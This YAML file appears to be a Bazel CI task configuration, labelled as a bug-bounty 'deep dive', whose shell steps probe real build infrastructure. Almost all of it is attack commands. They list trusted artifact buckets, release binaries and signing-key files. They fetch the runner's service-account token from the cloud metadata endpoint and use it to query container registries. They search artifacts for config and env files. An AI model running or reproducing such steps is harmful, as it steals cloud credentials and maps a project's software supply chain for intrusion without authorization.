---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 6: Deep Dive Trusted Artifacts ==="
      - "echo"
      - "echo === 1. List 20 recent trusted artifact dirs with sizes ==="
      - "gsutil ls -l gs://bazel-trusted-buildkite-artifacts/ 2>&1 | tail -25 || true"
      - "echo"
      - "echo === 2. Full recursive listing of trusted artifact A ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/ffff3095-c60a-45d3-93f8-254c3e8eeb28/ 2>&1 || true"
      - "echo"
      - "echo === 3. Full recursive listing of trusted artifact B ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/fffe94c5-0430-4bf3-828f-5106205c8128/ 2>&1 || true"
      - "echo"
      - "echo === 4. Full recursive listing of trusted artifact C ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/fffc0cc0-0421-4d3a-8cfd-ee1890c4c620/ 2>&1 || true"
      - "echo"
      - "echo === 5. Full recursive listing of trusted artifact D ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/fffb005d-9095-4708-96f3-77beea1b7b8c/ 2>&1 || true"
      - "echo"
      - "echo === 6. Full recursive listing of trusted artifact E (has bazel-bin) ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/fffaccd0-be41-4833-aff9-eb6ce5389a82/ 2>&1 || true"
      - "echo"
      - "echo === 7. Try older trusted artifacts with more content ==="
      - "gsutil ls gs://bazel-trusted-buildkite-artifacts/ 2>&1 | head -20 || true"
      - "echo"
      - "echo === 8. Recursive list first artifact dir ==="
      - "FIRST=$(gsutil ls gs://bazel-trusted-buildkite-artifacts/ 2>&1 | head -1)"
      - "echo Dir: $FIRST"
      - "gsutil ls -rl $FIRST 2>&1 || true"
      - "echo"
      - "echo === 9. List release dir contents gs://bazel/9.1.0/release/ ==="
      - "gsutil ls -rl gs://bazel/9.1.0/release/ 2>&1 || true"
      - "echo"
      - "echo === 10. Stat release binary ==="
      - "gsutil stat gs://bazel/9.1.0/release/bazel-9.1.0-linux-x86_64 2>&1 || true"
      - "echo"
      - "echo === 11. List release candidate contents ==="
      - "gsutil ls -rl gs://bazel/9.1.0/rc3/ 2>&1 | head -40 || true"
      - "echo"
      - "echo === 12. Check for signing keys or GPG files in releases ==="
      - "gsutil ls gs://bazel/9.1.0/release/ 2>&1 | grep -i 'sig\\|gpg\\|key\\|sign\\|sha\\|asc' || true"
      - "echo"
      - "echo === 13. List APT pool contents ==="
      - "gsutil ls -rl gs://bazel-apt/pool/jdk1.8/ 2>&1 | tail -30 || true"
      - "echo"
      - "echo === 14. Check GCR release image manifests ==="
      - "T=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')"
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/centos7-releaser/tags/list' 2>&1 | python3 -m json.tool 2>&1 | head -50 || true"
      - "echo"
      - "echo === 15. Check GCR rockylinux8-releaser ==="
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/rockylinux8-releaser/tags/list' 2>&1 | python3 -m json.tool 2>&1 | head -50 || true"
      - "echo"
      - "echo === 16. Try pulling release image manifest ==="
      - "curl -s -H \"Authorization: Bearer $T\" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' 'https://gcr.io/v2/bazel-public/centos7-releaser/manifests/latest' 2>&1 | python3 -m json.tool 2>&1 || true"
      - "echo"
      - "echo === 17. Check bazel-untrusted Container Registry contents ==="
      - "gsutil ls -rl gs://artifacts.bazel-untrusted.appspot.com/containers/ 2>&1 | head -30 || true"
      - "echo"
      - "echo === 18. Search for env files or configs in trusted artifacts ==="
      - "gsutil ls -r gs://bazel-trusted-buildkite-artifacts/ffee0ea2-d99c-4ed6-a194-c24e755c8d9b/ 2>&1 || true"
      - "echo"
      - "echo === 19. Check another trusted artifact ==="
      - "gsutil ls -r gs://bazel-trusted-buildkite-artifacts/ffed7555-2421-47ac-a482-501118a2e473/ 2>&1 || true"
      - "echo"
      - "echo === 20. Check trusted artifact with potential logs ==="
      - "gsutil ls -r gs://bazel-trusted-buildkite-artifacts/ffec3b54-0779-44d2-b856-797149cad7ed/ 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
